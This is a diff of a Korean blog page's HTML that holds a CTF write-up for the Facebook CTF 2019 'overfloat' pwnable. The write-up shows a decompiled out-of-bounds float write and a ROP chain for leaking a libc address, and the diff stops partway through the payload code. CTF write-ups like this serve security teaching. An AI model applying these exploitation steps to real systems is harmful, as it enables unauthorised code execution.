@@ -87,7 +87,7 @@
     
     
     
-    <link rel="stylesheet" href="/css/academic.9d6ce9c04eee97bcc8f93581ce7495e2.css">
+    <link rel="stylesheet" href="/css/academic.e78f017ea792fc76a38fabdaae146b55.css">
   
 
   
@@ -426,8 +426,8 @@
 
 
 
-<meta content="2019-06-01 21:47:09 &#43;0900 KST" itemprop="datePublished">
-<meta content="2019-06-01 21:47:09 &#43;0900 KST" itemprop="dateModified">
+<meta content="2019-06-01 21:47:09 &#43;0900 &#43;0900" itemprop="datePublished">
+<meta content="2019-06-01 21:47:09 &#43;0900 &#43;0900" itemprop="dateModified">
 
 <div class="article-metadata">
 
@@ -536,20 +536,15 @@
   <div class="article-container">
 
     <div class="article-style" itemprop="articleBody">
-      
-
-<p>Facebook CTF 2019 Pwnable Overfloat Writeup</p>
-
+      <p>Facebook CTF 2019 Pwnable Overfloat Writeup</p>
 <h1 id="목차">목차</h1>
-
 <ol>
-<li><a href="#요약">요약</a></li>
-<li><a href="#분석-대상">분석 대상</a></li>
-<li><a href="#공격-벡터-찾기">공격 벡터 찾기</a></li>
-<li><a href="#익스-코드">익스 코드</a></li>
-<li><a href="#시나리오">시나리오</a></li>
+<li><a href="#%EC%9A%94%EC%95%BD">요약</a></li>
+<li><a href="#%EB%B6%84%EC%84%9D-%EB%8C%80%EC%83%81">분석 대상</a></li>
+<li><a href="#%EA%B3%B5%EA%B2%A9-%EB%B2%A1%ED%84%B0-%EC%B0%BE%EA%B8%B0">공격 벡터 찾기</a></li>
+<li><a href="#%EC%9D%B5%EC%8A%A4-%EC%BD%94%EB%93%9C">익스 코드</a></li>
+<li><a href="#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4">시나리오</a></li>
 </ol>
-
 
 
 
@@ -559,132 +554,115 @@
 
 
 </figure>
-
 <h1 id="요약">요약</h1>
-
-<hr />
-
+<hr>
 <p><code>#CWE-129</code>, <code>#CWE-787</code>, <code>#CWE-788</code>, <code>#ROP</code>, <code>#chaining</code></p>
-
 <p>이번 문제는 overflow + float을 합성한 overfloat 이란 문제이며
 일반적인 버퍼 오버플로가 아니라
 float형으로 메모리에 저장한다는 특징을 갖는다.
 float형을 입력받아서 메모리에 차곡차곡 저장하는데 무한 반복문에 의해서 리턴 주소(RET)까지 덮어서 ROP 공격이 가능합니다.
 단, 메모리에 float형으로 저장된다는 것만 유의하면 됩니다.</p>
-
-<p>CWE-129: 검증되지 않은 배열 인덱스의 사용<br />
-CWE-787: Out-of-bounds 쓰기<br />
+<p>CWE-129: 검증되지 않은 배열 인덱스의 사용<br>
+CWE-787: Out-of-bounds 쓰기<br>
 CWE-788: 할당된 버퍼 크기를 넘어선 메모리의 쓰기</p>
-
 <h1 id="분석-대상">분석 대상</h1>
-
-<hr />
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># md5sum overfloat* libc-2.27.so</span>
-b2e922b5a36288d9deedd76beb34f417  overfloat
-72c884e14c2cbce04b1f9f8ed7b2f3df  overfloat.tar.gz
-50390b2ae8aaa73c47745040f54e602f  libc-2.27.so
-
-<span style="color:#75715e"># file overfloat libc-2.27.so</span>
-overfloat:    ELF <span style="color:#ae81ff">64</span>-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux <span style="color:#ae81ff">2</span>.6.32, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>8ae8ef04d2948115c648531ee0c12ba292b92ae4, not stripped
-libc-2.27.so: ELF <span style="color:#ae81ff">64</span>-bit LSB pie executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>GNU/Linux<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0, <span style="color:#66d9ef">for</span> GNU/Linux <span style="color:#ae81ff">3</span>.2.0, stripped</code></pre></div>
-
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># md5sum overfloat* libc-2.27.so</span>
+</span></span><span style="display:flex;"><span>b2e922b5a36288d9deedd76beb34f417  overfloat
+</span></span><span style="display:flex;"><span>72c884e14c2cbce04b1f9f8ed7b2f3df  overfloat.tar.gz
+</span></span><span style="display:flex;"><span>50390b2ae8aaa73c47745040f54e602f  libc-2.27.so
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># file overfloat libc-2.27.so</span>
+</span></span><span style="display:flex;"><span>overfloat:    ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.32, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>8ae8ef04d2948115c648531ee0c12ba292b92ae4, not stripped
+</span></span><span style="display:flex;"><span>libc-2.27.so: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>GNU/Linux<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, stripped</span></span></code></pre></div>
 <h1 id="공격-벡터-찾기">공격 벡터 찾기</h1>
-
-<hr />
-
-<p><div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+<hr>
+<p><div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">chart_course</span>(<span style="color:#66d9ef">__int64</span> a1)
-{
-  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax@6
-</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// xmm1_4@8
-</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s; <span style="color:#75715e">// [sp+10h] [bp-70h]@5
-</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [sp+78h] [bp-8h]@8
-</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [sp+7Ch] [bp-4h]@1
-</span><span style="color:#75715e"></span>
-  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ; <span style="color:#f92672">++</span>i )
-  {
-    <span style="color:#66d9ef">if</span> ( i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> )
-      printf(<span style="color:#e6db74">&#34;LON[%d]: &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>));
-    <span style="color:#66d9ef">else</span>
-      printf(<span style="color:#e6db74">&#34;LAT[%d]: &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>));
-    fgets(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0x64</span>, stdin);
-    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>strncmp(<span style="color:#f92672">&amp;</span>s, <span style="color:#e6db74">&#34;done&#34;</span>, <span style="color:#ae81ff">4uLL</span>) )
-      <span style="color:#66d9ef">break</span>;
-    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">float</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v2 <span style="color:#f92672">=</span> atof(<span style="color:#f92672">&amp;</span>s);
-    v4 <span style="color:#f92672">=</span> v2;
-    memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x64uLL</span>);
-    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">4LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> a1) <span style="color:#f92672">=</span> v4;
-LABEL_9:
-    ;
-  }
-  result <span style="color:#f92672">=</span> i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>;
-  <span style="color:#66d9ef">if</span> ( i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> )
-  {
-    puts(<span style="color:#e6db74">&#34;WHERES THE LONGITUDE?&#34;</span>);
-    <span style="color:#f92672">--</span>i;
-    <span style="color:#66d9ef">goto</span> LABEL_9;
-  }
-  <span style="color:#66d9ef">return</span> result;
-}</code></pre></td></tr></table>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">chart_course</span>(<span style="color:#66d9ef">__int64</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax@6
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// xmm1_4@8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s; <span style="color:#75715e">// [sp+10h] [bp-70h]@5
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [sp+78h] [bp-8h]@8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [sp+7Ch] [bp-4h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;LON[%d]: &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;LAT[%d]: &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>));
+</span></span><span style="display:flex;"><span>    fgets(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0x64</span>, stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>strncmp(<span style="color:#f92672">&amp;</span>s, <span style="color:#e6db74">&#34;done&#34;</span>, <span style="color:#ae81ff">4uLL</span>) )
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">float</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v2 <span style="color:#f92672">=</span> atof(<span style="color:#f92672">&amp;</span>s);
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> v2;
+</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x64uLL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">4LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> a1) <span style="color:#f92672">=</span> v4;
+</span></span><span style="display:flex;"><span>LABEL_9:
+</span></span><span style="display:flex;"><span>    ;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;WHERES THE LONGITUDE?&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span>i;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_9;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
 </div>
 </div>
 위 함수는 주어진 바이너리 overfloat의 사용자 정의 함수 chart_course입니다.
 유일하게 입력할 수 있는 곳은 지역변수 s밖에 없으므로 공격 벡터는 지역변수 s입니다.</p>
-
 <p>chart_course 함수는 입력 데이터를 string형으로 받아서 float형으로 변환한 다음 a1에 배열로 접근해서 값을 저장합니다.
 반복문이 무한히 돌기 때문에 a1[i++]로 리턴 주소(RET)까지 덮을 수 있죠.</p>
-
 <h1 id="시나리오">시나리오</h1>
-
-<hr />
-
+<hr>
 <p>공격 벡터를 알았으면 이제 어떻게 익스를 할 것인지 시나리오를 생각해야 하는데요.
 무한 반복문 덕분에 RET와 그 넘어서 RET+8, RET+0x10, &hellip; 을 덮어씌울 수 있으니까 chaining 기법을 사용할 수 있겠군요!</p>
-
 <p>그럼 chaining으로 어떤 작업을 해야 할까요?
 pwnable의 최종 목표는 쉘을 따서 flag를 cat으로 읽어오는 것입니다.
 그럼 쉘을 따는 작업을 해야겠죠?
 마침 문제 출제자가 libc-2.27.so 라이브러리를 제공해주었습니다.
 즉 라이브러리로 쉘을 따라는 건데요.
 라이브러리를 이용하기 위해서는 <strong>라이브러리 leak</strong>을 먼저 해줘야 합니다.</p>
-
 <p>leak에 이용할 수 있을만한 출력 함수가 무엇이 있는지 찾아볼까요? 다음은 .got 영역입니다.
 
 
@@ -698,137 +676,118 @@ pwnable의 최종 목표는 쉘을 따서 flag를 cat으로 읽어오는 것입�
 puts, printf가 있네요.
 둘 중 아무거나 써도 될 거 같아요.
 저는 puts를 썼어요.</p>
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> overfloat <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./overfloat&#39;</span>)
-<span style="color:#f92672">&gt;&gt;&gt;</span> hex(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts)
-<span style="color:#e6db74">&#39;0x400690&#39;</span></code></pre></div>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> overfloat <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./overfloat&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> hex(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0x400690&#39;</span></span></span></code></pre></div>
 <p>그리고 puts의 매개변수로 무얼 넘겨야 할까요?
 바로 라이브러리의 주소가 나올만한 것들이겠죠?
 .got 영역에 있는 함수나 _IO_2_1_stdin_를 매개변수로 넘기면 라이브러리 주소인 0x7fxxxxxxxxxx가 출력될 것입니다.
 저는 _IO_2_1_stdin_를 puts의 매개변수로 잡았습니다.</p>
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>)
-<span style="color:#f92672">&gt;&gt;&gt;</span> hex(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_IO_2_1_stdin_)
-<span style="color:#e6db74">&#39;0x3eba00&#39;</span></code></pre></div>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> hex(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_IO_2_1_stdin_)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0x3eba00&#39;</span></span></span></code></pre></div>
 <p>_IO_2_1_stdin_의 주소를 보니 0x00으로 끝나는 것을 주의해주세요!
 문자열 출력을 위해서 stdin@GLIBC_2_2_5 +1을 해줘야만 해요.</p>
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> hex(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
-<span style="color:#e6db74">&#39;0x602091&#39;</span></code></pre></div>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> hex(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0x602091&#39;</span></span></span></code></pre></div>
 <p>여기까지가 _IO_2_1_stdin_을 출력하기 위해 필요한 가젯(Gadget)을 모은 것입니다.
 오우! 한가지 빼먹은 것이 있었네요.
 이번 바이너리는 64비트 ELF입니다.
 함수 호출 규약 fastcall에서는 함수의 첫 번째 매개변수를 전달하는 방식이 rdi 레지스터를 이용한다는 것입니다.
 간단히 pwntools로 가젯을 모았어요.</p>
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> rop <span style="color:#f92672">=</span> ROP(overfloat)
-<span style="color:#f92672">&gt;&gt;&gt;</span> hex(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address)
-<span style="color:#e6db74">&#39;0x400a83&#39;</span></code></pre></div>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> rop <span style="color:#f92672">=</span> ROP(overfloat)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> hex(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0x400a83&#39;</span></span></span></code></pre></div>
 <p>이제야 _IO_2_1_stdin_을 출력하기 위해 필요한 가젯을 다 모았군요.
 일반적인 페이로드라면 다음과 같았겠죠.</p>
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-payload <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address)
-payload <span style="color:#f92672">+=</span> p64(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
-payload <span style="color:#f92672">+=</span> p64(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts)</code></pre></div>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address)
